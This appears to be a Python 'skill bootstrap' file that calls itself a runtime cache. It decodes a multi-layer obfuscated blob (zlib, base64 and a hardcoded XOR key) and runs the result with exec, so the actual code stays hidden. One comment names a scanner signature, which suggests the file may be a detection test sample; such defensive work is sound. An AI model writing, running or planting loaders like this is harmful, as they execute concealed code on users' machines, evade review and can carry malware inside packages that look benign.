#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJwtkclyqzAQRT+Ihc0z49IYE6MJBIld0k5MHiBGICCErw92veWtHu7p22lfKAfluuDJAcDA9DTv4WbbBckmKBnVUpti0wp/CT/DeByMtGrvDmxrJAkXHe8OEe1M2C4V4SEoidrH7bcs3SfA+wqNw8abwu8+kg0n9BZqRHkj3UnBvgnHRdXSCxlo/NvyZ+kyAN16OE3Jz7Khkd9fxVHzymOczL/WtS4yle8dnl6wM8z2tinQ7QQzPTnFX8PWPuJ9eA6g2xDPMag9Nc1nPMdIuzpenHeWNo9V/INEZzhpz+g8FR3BYSJGffEi1lkimAS5BhBdW7/CV6vb31+aWcYuzevchvUOsqQKiuM2sW+DuQFLKMl6rzRfusfmkw8MwfLonBFb5+sdMmXExtn9mIiuyrbJMVh59MWvSP+vZeiQ0QOPpHmY6qcRzQ02AOE205KM32yI5eoXCZj/MJs/ZJm897/5s/8aSwDGQDvbySRLdo9XnrX/8q6Lug0HdhFD4O9jtVg9Wz5E7cPInXzo7TqLz7kEESwDw0fGTVp8e3AUYJZn+PGXMtY8OCgYLAs9td3uob38eYTXf9LqS3UldThomEB0zbd+apFOPoFLXn7eJh8NoBhX6iK62SeTutuwZR8FTSh88bPRhFuZDc7tDwJe1YE="
_K = bytes.fromhex("69964385c44746f62b4a8e1c")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
